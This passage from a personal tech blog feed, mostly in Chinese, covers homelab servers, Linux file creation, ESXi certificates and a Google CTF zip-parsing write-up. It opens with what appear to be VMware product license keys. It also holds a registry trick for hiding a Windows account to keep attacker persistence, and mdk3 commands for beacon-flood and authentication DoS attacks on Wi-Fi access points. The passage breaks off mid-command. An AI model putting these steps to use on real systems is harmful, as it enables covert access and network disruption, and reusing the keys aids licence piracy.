SAN</h2><p>JU2D8-4CL82-088R1-RLAX2-3K8L0 1A6JU-0JK0P-481W0-70AE0-2QAJ84C48A-27HDH-48001-YH2E4-9ZUQF 4V252-FHH8K-480A1-VCAQM-A2KQ4</p><h2 id="virual-san-for-desktop">Virual SAN for Desktop</h2><p>4F25K-4N392-M8161-132XP-1GR3F 0A4MR-49K93-08890-FR97K-93R4AJU2EH-08K4N-M8DC0-4T3E2-33UH4 4Z6MU-2J383-481N1-G91QP-1Y2PA</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>思科UCS服务器电源策略与风扇音量</title>
      <link href="/2022/09/13/si-ke-ucs-fu-wu-qi-dian-yuan-ce-lue-yu-feng-shan-yin-liang/"/>
      <url>/2022/09/13/si-ke-ucs-fu-wu-qi-dian-yuan-ce-lue-yu-feng-shan-yin-liang/</url>
      
        <content type="html"><![CDATA[<h1 id="思科ucs服务器电源策略与风扇音量">思科UCS服务器电源策略与风扇音量</h1><h2 id="前情提要">前情提要</h2><p>前些日子组建了由 Cisco UCS 和 Dell PowerEdge 系列产品构成的 HomeLab.由于不是在正规的机房环境，所以对降噪的要求来说就很高。而风扇的噪音又是服务器的大头。</p><h2 id="噪音大头">噪音大头</h2><p>前面说了，服务器整体的噪音主要是风扇造成的。而风扇高速运行的成因又有很多：</p><ul><li>机箱入侵（打开后盖）</li><li>有风扇离线</li><li>温度过热</li><li><strong>加装了不在白名单内的 PCIe 卡</strong></li></ul><p>如果加装了 RAID 卡和其他 PCIe卡可能会产生非常高的温度（50-60°C），所以 CIMC会缺省地把电源策略改为平衡（Balanced）。</p><h2 id="refer">Refer:</h2><ul><li><a href="https://www.cisco.com/en/US/docs/unified_computing/ucs/c/sw/gui/config/guide/1.5/b_Cisco_UCS_C-series_GUI_Configuration_Guide.151_chapter_011.html#concept_8CB787DF70304E98BE25D120466418B9">CiscoUCS C-Series Servers Integrated Management Controller GUI ConfigurationGuide, Release 1.5</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 中新建文件</title>
      <link href="/2022/09/13/linux-zhong-xin-jian-wen-jian/"/>
      <url>/2022/09/13/linux-zhong-xin-jian-wen-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="linux-中新建文件">Linux 中新建文件</h1><h2 id="使用touch命令创建文件">使用touch命令创建文件</h2><p><strong>touch</strong>命令可以让你更新现有文件和目录的时间戳以及创建新文件。创建新的空文件的最简单，最难忘的方法是使用touch 命令。</p><p>如果 touch参数指定的文件不存在，则上面的命令将创建该文件，否则，它将更改文件的时间戳。</p><p>touch 也可以同时创建多个文件。如需要创建多个文件，在 touch命令的参数中指定多个文件名，并用空格进行分隔。</p><p>以 touch命令将会要创建新文件<code>file1.txt</code>，如果<code>file1.txt</code>文件存在，则更新文件<code>file1.txt</code>时间戳：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> file1.txt <span class="token comment">#创建一个文件</span><span class="token function">touch</span> file1.txt file2.txt file3.txt <span class="token comment">#创建多个文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="使用重定向运算符创建文件">使用重定向运算符创建文件</h2><p>重定向允许捕获命令的输出，并将其作为另一个命令或文件的输入。有两个重定向操作符可以将输出重定向到文件。</p><p>当使用重定向操作符创建文件时，如果不存在，文件将会被创建。如果使用重定向操作符&gt;时现有文件已经存在，文件将会被覆盖</p><p>而使用重定向操作符&gt;&gt;则不会覆盖已经存在的文件，而是追加已经存在的文件中。使用重定向操作符，是Linux中创建新文件的最短命令。</p><p>当你运行<code>&gt; file1.txt</code>命令按下回车键enter时，此时将允许你输出文本内容。然不是马上就退出。当你完成输入后，按ctrl+d两次退出命令。</p><p>你可以使用ctrl+c退出重定向创建文件的方法，ctrl+c和ctrl+d不同之处在于ctrl+c按一次即可退出，而ctrl+d是两次，ctrl+c至于是否会丢失内容，暂时没发现。</p><p>要使用重定向操作符创建文件，只需在重定向操作符之后指定要创建的文件名即可以下重定向操作符将要创建文件file1.txt：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> file1.txt在此处输入内容<span class="token operator">&gt;&gt;</span> file1.txt在此处输入内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>记得使用ctrl+c或者ctrl+d退出重定向操作符。</p><h2 id="使用cat命令创建文件">使用cat命令创建文件</h2><p>cat命令主要用于读取和连接文件，但它也可以用于创建新的文件。使用cat创建文件的方式和使用重定向操作符一样。</p><p>使用这种cat创建文件的方式，在退出时和使用重定向操作符一样。也是按ctrl+c和ctrl+d保存文件。两种方式跟在使用重定向操作符一样。</p><p>如需要使用cat创建新文件，请运行cat命令，后跟重定向操作符&gt;和&gt;&gt;，然后是要创建的文件名。完成输入后按ctrl+c和ctrl+d保存文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token operator">&gt;</span> file1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="使用echo命令创建文件">使用echo命令创建文件</h2><p>echo命令的标准输出可以被重定向到文件。也可使用两个重定向操作符可以将输出重定向到文件。</p><p>要使用echo创建新文件，后跟要输入到文件的文本内容，然后使用重定向操作符&gt;和&gt;&gt;，将标准输出写入到要创建的文件中。</p><p>如果只需要使用echo创建一个空文件，则可省略输入文本内容，而是echo一个空的字符串到文件。</p><p>以下echo命令将会创建文件file1.txt。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Some line"</span> <span class="token operator">&gt;</span> file1.txt<span class="token builtin class-name">echo</span> <span class="token operator">&gt;</span> file1.txt <span class="token comment">#创建空文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="使用heredoc创建文件">使用Heredoc创建文件</h2><p>heredoc翻译过来就是here文档，又称作heredoc、hereis、here-string或here-script，是一种在shell的命令。</p><p>如sh、csh、ksh、bash、PowerShell和zsh和程序语言里定义一个字符串的方法。它可以保存文字里面的换行或是缩进等空白符。它允许你在字符串里执行变量插入和命令替换。</p><p>当您要从Shell脚本创建包含多行文本，插入环境变量，运行命令的替换时，通常使用此方法。</p><p>在heredoc只是定义一个shell的变量，它不会自动写入到文件。因此使用Heredoc创建文件时，还需要使用重定向操作符&gt;和&gt;&gt;。</p><p>例如要创建一个包含多行文本新文件file1.txt，执行$USER环境变量的插入，运行pwd命令的替换。您将使用以下heredoc创建file1.txt：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;&lt;</span> <span class="token string">EOF<span class="token bash punctuation"> <span class="token operator">&gt;</span> file1.txt</span>your user name is <span class="token environment constant">$USER</span>your workdir <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span>other lineEOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="创建一个大文件">创建一个大文件</h2><p>有时，出于测试目的，您可能需要创建一个大文件。当您要测试驱动器的写入速度或测试连接的下载速度时，此功能很有用。</p><p>你可以使用dd命令或者fallocate命令创建大文件。dd命令主要用于转存和复制文件。fallocate命令用于为文件分配实际的磁盘空间。</p><p>以下两个命令是等价命令，dd命令fallocate命令都将会创建一个大小为1GB的文件1G.test：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>/dev/zero <span class="token assign-left variable">of</span><span class="token operator">=</span>1G.test <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">seek</span><span class="token operator">=</span>1Gfallocate <span class="token parameter variable">-l</span> 1G 1G.test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HomeLab SSL Deployment</title>
      <link href="/2022/08/30/homelab-ssl-deployment/"/>
      <url>/2022/08/30/homelab-ssl-deployment/</url>
      
        <content type="html"><![CDATA[<h1 id="homelab-environment-ssl-certification-deployment">HomeLabEnvironment SSL Certification Deployment</h1><h2 id="vmware-hypervisor-esxi">VMware HyperVisor / ESXi</h2><p>I have a ESXi 6.7 on my Cisco C220 M3 for my HomeLab. Unfortunately,most of my services are exposed to CERNET-2 and local LAN (my school).So it's necessary to confirm it works under protection.</p><h3 id="request-a-certification-for-yourself">Request A Certificationfor Yourself</h3><p>At here, I chose TrustAsia to be my SSL-Cert provider. (You can helpyourself to use another one). This procedure is basicly submitting anideal domain for your ESXi managment interface and fill up DNSvalidation (If you use DNSPod by Tencent, it will automaticlly do thatfor you).</p><p>Now you have your own certification.</p><h3 id="deploy-it-to-your-esxi-instance">Deploy It to Your ESXiInstance</h3><h4 id="upload-certifications">Upload Certifications</h4><p>Enable SSH services on ESXi interface.</p><blockquote><p>At: <strong>Host -&gt; Actions -&gt; Services -&gt; Enable SecureShell (SSH)</strong></p></blockquote><p>Now you have grant access to your ESXi. Login credentials are same asUI one.</p><p>The Default SSL certs in <code>/etc/vmware/ssl</code> are named<code>rui.crt</code> and <code>rui.key</code>. Make backups and deletethem. Rename your previously downloaded cert files to these and uploadto remote directory.</p><h4 id="restrat-the-services">Restrat the Services</h4><pre class="line-numbers language-none"><code class="language-none">/etc/init.d/hostd restart/etc/init.d/vpxa restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Host OS restart is <strong>not</strong> needed.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Cisco </tag>
            
            <tag> VMware </tag>
            
            <tag> HomeLab </tag>
            
            <tag> SSL </tag>
            
            <tag> Server </tag>
            
            <tag> ESXi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BIOS (U)EFI BGRT 与引导</title>
      <link href="/2022/08/16/bios-u-efi-bgrt-yu-yin-dao/"/>
      <url>/2022/08/16/bios-u-efi-bgrt-yu-yin-dao/</url>
      
        <content type="html"><![CDATA[<h1 id="bios-uefi-bgrt-与引导">BIOS (U)EFI BGRT 与引导</h1>]]></content>
      
      
      
        <tags>
            
            <tag> UEFI </tag>
            
            <tag> BIOS </tag>
            
            <tag> Windows </tag>
            
            <tag> 计组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dell G7 5788 黑苹果奇遇记</title>
      <link href="/2022/08/16/dell-g7-5788-hei-ping-guo-qi-yu-ji/"/>
      <url>/2022/08/16/dell-g7-5788-hei-ping-guo-qi-yu-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="dell-g7-5788-黑苹果奇遇记">Dell G7 5788 黑苹果奇遇记</h1><h2 id="教程列表">教程列表</h2><ul><li><a href="https://taruyato.github.io/g7-7588-guide/">https://taruyato.github.io/g7-7588-guide/</a></li><li><a href="https://apple.sqlsec.com">https://apple.sqlsec.com</a></li><li><a href="https://blog.daliansky.net">https://blog.daliansky.net</a></li></ul><h2 id="先说坑点">先说坑点</h2><ul><li>记得CFGUnlock</li><li>GitHub里提供的EFI是完美适配的，如果遇到关机不断电的情况可以尝试拔下电源电池和CMOS电池</li></ul><h2 id="安装步骤">安装步骤</h2><ol type="1"><li>调教BIOS设置</li><li>装 macOS</li><li>装引导</li></ol><p>没了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Dell </tag>
            
            <tag> Hackintosh </tag>
            
            <tag> 黑苹果 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 权限维持 - 隐藏账户</title>
      <link href="/2022/08/16/windows-quan-xian-wei-chi-yin-cang-zhang-hu/"/>
      <url>/2022/08/16/windows-quan-xian-wei-chi-yin-cang-zhang-hu/</url>
      
        <content type="html"><![CDATA[<h2 id="registry">Registry</h2><p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code>中新建DWORD键，名称为需要隐藏的账户</p><p>在 UWP 和 Win32 设置和控制面板中均不会展示</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> CTF </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleCTF 2022 - Appnote</title>
      <link href="/2022/07/10/googlectf-2022-appnote/"/>
      <url>/2022/07/10/googlectf-2022-appnote/</url>
      
        <content type="html"><![CDATA[<h1 id="write-up-misc---appnote.txt-google-ctf-2022">Write-Up: Misc -Appnote.txt Google CTF 2022</h1><h2 id="题目">题目</h2><p>You are given an archive file that contains the flag somehow, butconventionally unpacking it does not lead to anything useful.</p><p>直接用二进制编辑器打开文件，发现：</p><ul><li><code>hello.txt</code> 里面是 “There’s more to it than meets theeye…”</li><li>`hi.txt 写着 “Find a needle in the haystack…”（大海捞针）然后是一些形如 flagXX 的文件。XX 在 00 和 18之间，每个文件重复36次。提取全部txt内部的字符后，得到字符串：“abcdefghijklmnopqrstuvwxyz{CTF0137}_”.</li></ul><p>这个字符串跟flag并无太大关联，但给了我们一些线索。我们注意到ZIP文件中还存在着其他信息。</p><p>EOCDs 的 hexdump:</p><pre class="line-numbers language-none"><code class="language-none">0000eecc: 504b 0506 0000 0000 0100 0100 00ee 0000  PK..............0000eedc: cc00 0000 b801 504b 0506 0000 0000 0100  ......PK........0000eeec: 0100 5ae4 0000 880a 0000 a201 504b 0506  ..Z.........PK..0000eefc: 0000 0000 0100 0100 93d7 0000 6517 0000  ............e...0000ef0c: 8c01 504b 0506 0000 0000 0100 0100 ccca  ..PK............0000ef1c: 0000 4224 0000 7601 504b 0506 0000 0000  ..B$..v.PK......0000ef2c: 0100 0100 69bf 0000 bb2f 0000 6001 504b  ....i..../..`.PK0000ef3c: 0506 0000 0000 0100 0100 ceb6 0000 6c38  ..............l80000ef4c: 0000 4a01 504b 0506 0000 0000 0100 0100  ..J.PK..........0000ef5c: 29a5 0000 274a 0000 3401 504b 0506 0000  )...'J..4.PK....0000ef6c: 0000 0100 0100 e79c 0000 7f52 0000 1e01  ...........R....0000ef7c: 504b 0506 0000 0000 0100 0100 428b 0000  PK..........B...0000ef8c: 3a64 0000 0801 504b 0506 0000 0000 0100  :d....PK........0000ef9c: 0100 2186 0000 7169 0000 f200 504b 0506  ..!...qi....PK..0000efac: 0000 0000 0100 0100 7173 0000 377c 0000  ........qs..7|..0000efbc: dc00 504b 0506 0000 0000 0100 0100 6670  ..PK..........fp0000efcc: 0000 587f 0000 c600 504b 0506 0000 0000  ..X.....PK......0000efdc: 0100 0100 e359 0000 f195 0000 b000 504b  .....Y........PK0000efec: 0506 0000 0000 0100 0100 ac52 0000 3e9d  ...........R..&gt;.0000effc: 0000 9a00 504b 0506 0000 0000 0100 0100  ....PK..........0000f00c: a247 0000 5ea8 0000 8400 504b 0506 0000  .G..^.....PK....0000f01c: 0000 0100 0100 8e33 0000 88bc 0000 6e00  .......3......n.0000f02c: 504b 0506 0000 0000 0100 0100 9a2a 0000  PK...........*..0000f03c: 92c5 0000 5800 504b 0506 0000 0000 0100  ....X.PK........0000f04c: 0100 161c 0000 2cd4 0000 4200 504b 0506  ......,...B.PK..0000f05c: 0000 0000 0100 0100 3815 0000 20db 0000  ........8... ...0000f06c: 2c00 504b 0506 0000 0000 0100 0100 2f02  ,.PK........../.0000f07c: 0000 3fee 0000 1600 504b 0506 0000 0000  ..?.....PK......0000f08c: 0100 0100 34f0 0000 5000 0000 0000       ....4...P.....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个分区都以 “PK”开始，然后是8个无用的字节，4个字节表示大小，4字节表示偏移（offset）。</p><p>然后，将其“合法编码”为适当的 ZIP文件的方式是，它声明所有的 EOCD都在前一个文件的注释字段中。</p><p>除其他字段外，ECDR包含中央目录的大小（以字节为单位）和从文件开头开始的偏移字节，两者都是 4字节的小端整数。所以从偏移字节开始会找到对应的CDH。CDH有很多字段，包括本地头的相对偏移量，它再次给出了从文件开头到相应LFH的偏移量。此外，CDH和 LFH 都将压缩方法字段设置为“”，即不压缩。LFH 之后是我们的数据。</p><p>中央目录记录结束 =&gt; 中央目录头 =&gt; 本地文件头 =&gt; 数据</p><p>如果使用我们找到的大小和偏移量，并从文件中的“分段”中提取文本，得到了一系列字符串：</p><pre class="line-numbers language-none"><code class="language-none">abcdefghijklmnopqrstuvwxyz{CTF0137}_TF0137}_F0137}_0137}_abcdefghijklmnopqrstuvwxyz{CTF0137}_CTF0137}_qrstuvwxyz{CTF0137}_137}_tuvwxyz{CTF0137}_}_nopqrstuvwxyz{CTF0137}_137}_efghijklmnopqrstuvwxyz{CTF0137}_7}_stuvwxyz{CTF0137}_opqrstuvwxyz{CTF0137}_{CTF0137}_37}_qrstuvwxyz{CTF0137}__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在我们可以肯定这就是flag了。 如果假设flag格式是<code>CTF{****}</code> 的话，那么就有如下结论：</p><ul><li>第一行是某种类似“字典”的转换规则</li><li>所有后面的行都代表标志的一个字符，这里是截断位置前的那一个字符</li></ul><p>编写脚本来提取flag：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rerex <span class="token operator">=</span> <span class="token string">b"flag[0-9][0-9](.)PK\x01\x02"</span>rexf <span class="token operator">=</span> <span class="token string">b"PK\x05\x06[\x00-\xFF]{8}([\x00-\xFF]{4})([\x00-\xFF]{4})"</span>rexm <span class="token operator">=</span> <span class="token string">b"(.)"</span>patt <span class="token operator">=</span> <span class="token string">b""</span>first <span class="token operator">=</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">collect</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> first<span class="token punctuation">,</span> patt    <span class="token keyword">if</span> first<span class="token punctuation">:</span>        <span class="token keyword">for</span> datum <span class="token keyword">in</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>rex<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>            patt <span class="token operator">+=</span> datum        patt <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>patt<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> patt        first <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token string">""</span>    datum <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>rex<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> patt<span class="token punctuation">[</span>patt<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span>datum<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>patt<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span>datum<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ASCII"</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"dump.zip"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> dump<span class="token punctuation">:</span>    data <span class="token operator">=</span> dump<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> size_b<span class="token punctuation">,</span> offset_b <span class="token keyword">in</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>rexf<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>size_b<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"little"</span><span class="token punctuation">)</span>        offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>offset_b<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"little"</span><span class="token punctuation">)</span>        c <span class="token operator">=</span> collect<span class="token punctuation">(</span>data<span class="token punctuation">[</span>offset<span class="token punctuation">:</span>offset<span class="token operator">+</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> recontent <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dump.zip'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">parse_int</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token comment"># 注意：此处为小端序！</span><span class="token comment"># 搜索EOCD记录</span><span class="token keyword">for</span> m <span class="token keyword">in</span> re<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span><span class="token string">b"PK\5\6"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>  i <span class="token operator">=</span> m<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 解析EOCD记录</span>  cent_dir_offset<span class="token operator">=</span> parse_int<span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 解析CDH</span>  local_header_offset<span class="token operator">=</span> parse_int<span class="token punctuation">(</span>content<span class="token punctuation">[</span>cent_dir_offset<span class="token operator">+</span><span class="token number">42</span><span class="token punctuation">:</span>cent_dir_offset<span class="token operator">+</span><span class="token number">42</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 解析LFH</span>  compressed_size <span class="token operator">=</span> parse_int<span class="token punctuation">(</span>content<span class="token punctuation">[</span>local_header_offset<span class="token operator">+</span><span class="token number">18</span><span class="token punctuation">:</span>local_header_offset<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  file_name_length <span class="token operator">=</span> parse_int<span class="token punctuation">(</span>content<span class="token punctuation">[</span>local_header_offset<span class="token operator">+</span><span class="token number">26</span><span class="token punctuation">:</span>local_header_offset<span class="token operator">+</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  content_start <span class="token operator">=</span> local_header_offset<span class="token operator">+</span><span class="token number">30</span><span class="token operator">+</span>file_name_length  comp_content <span class="token operator">=</span> content<span class="token punctuation">[</span>content_start<span class="token punctuation">:</span>content_start<span class="token operator">+</span>compressed_size<span class="token punctuation">]</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>comp_content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终的Flag是： <code>CTF{p0s7m0d3rn_z1p}</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Google </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows电源管理优化</title>
      <link href="/2022/06/24/windows-dian-yuan-guan-li-you-hua/"/>
      <url>/2022/06/24/windows-dian-yuan-guan-li-you-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="注册表">注册表</h2><h3 id="处理器电源管理-最大处理器频率">处理器电源管理-最大处理器频率</h3><p>HKEY_LOCAL_MACHINE\54533251-82be-4824-96c1-47b60b740d00\75b0ae3f-bce0-45a7-8c89-c9611c25e100</p><h3 id="处理器电源管理-最小处理器状态">处理器电源管理-最小处理器状态</h3><p>HKEY_LOCAL_MACHINE\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c</p><h3 id="处理器电源管理-系统散热方式">处理器电源管理-系统散热方式</h3><p>HKEY_LOCAL_MACHINE\54533251-82be-4824-96c1-47b60b740d00\94D3A615-A899-4AC5-AE2B-E4D8F634367F</p><h3 id="处理器电源管理-最大处理器状态">处理器电源管理-最大处理器状态</h3><p>HKEY_LOCAL_MACHINE\54533251-82be-4824-96c1-47b60b740d005038f7-23e0-4960-96da-33abaf5935ec</p><h3 id="睿频">睿频</h3><p>HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlPowerPowerSettings54533251-82be-4824-96c1-47b60b740d00be337238-0d82-4146-a960-4f3749d470c7</p><p>找到Attributes，将数值数据修改为2</p><h2 id="powershell-命令的方法">Powershell 命令的方法</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Add:powercfg <span class="token parameter variable">-attributes</span> SUB_PROCESSOR 75b0ae3f-bce0-45a7-8c89-c9611c25e100 <span class="token parameter variable">-ATTRIB_HIDE</span>Remove:powercfg <span class="token parameter variable">-attributes</span> SUB_PROCESSOR 75b0ae3f-bce0-45a7-8c89-c9611c25e100 +ATTRIB_HIDE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="reference">Reference</h2><ul><li>https://www.majorgeeks.com/content/page/how_to_add_or_remove_maximum_processor_frequency.html</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali无线渗透测试-aircrack/mdk3</title>
      <link href="/2022/05/17/kali-wu-xian-shen-tou-ce-shi-aircrack-mdk3/"/>
      <url>/2022/05/17/kali-wu-xian-shen-tou-ce-shi-aircrack-mdk3/</url>
      
        <content type="html"><![CDATA[<h2 id="mdk3">MDK3</h2><p>MDK3是一款无线攻击测试工具，能够发起BeaconFlood,AuthenticationDoS,Deauthentication/DisassociationAmok等模式的攻击 另外它还具有针对隐藏ESSID 的暴力探测模式、802.1X渗透测试、WIDS干扰等功能。</p><p><strong>首先激活无线网卡至监听模式</strong></p><pre class="line-numbers language-none"><code class="language-none">airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后输入</p><pre class="line-numbers language-none"><code class="language-none">mdk3 --fullhelp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看详细帮助内容</p><p>攻击命令为：</p><pre class="line-numbers language-none"><code class="language-none">mdk3 &lt;mon0&gt; &lt;参数&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em>mon0为监听模式的无线网卡，具体使用ifconfig查看</em></p><hr><h3 id="beacon-flood-mode">beacon flood mode</h3><p><em>发射大量死亡ssid来干扰其他使用者</em></p><p>使用</p><pre class="line-numbers language-none"><code class="language-none">mdk3 --help b  #查看详细内容 -n &lt;ssid&gt;               #自定义ESSID -f &lt;filename&gt;           #读取ESSID列表文件 -v &lt;filename&gt;           #自定义ESSID和BSSID对应列表文件 -d                     #自定义为Ad-Hoc模式 -w                      #自定义为wep模式 -g                      #54Mbit模式 -t                      # WPA TKIP encryption -a                      # WPA AES encryption -m                      #读取数据库的mac地址 -c &lt;chan&gt;               #自定义信道 -s &lt;pps&gt;                #发包速率<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用样例</p><pre class="line-numbers language-none"><code class="language-none">mdk3 mon0 b -f /root/list.txt -c 6 -s 100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="authentication-dos">Authentication DoS</h3><p>验证请求攻击模式：自动模拟随机产生的mac向目标AP发起大量验证请求，导致AP忙于处理过多的请求而停止对正常连接客户端的响应,迫使AP主人重启路由。(对于新型路由器效果不明显)</p><pre class="line-numbers language-none"><code class="language-none">mdk3 --help a  #查看详细内容 -a &lt;ap_mac&gt;              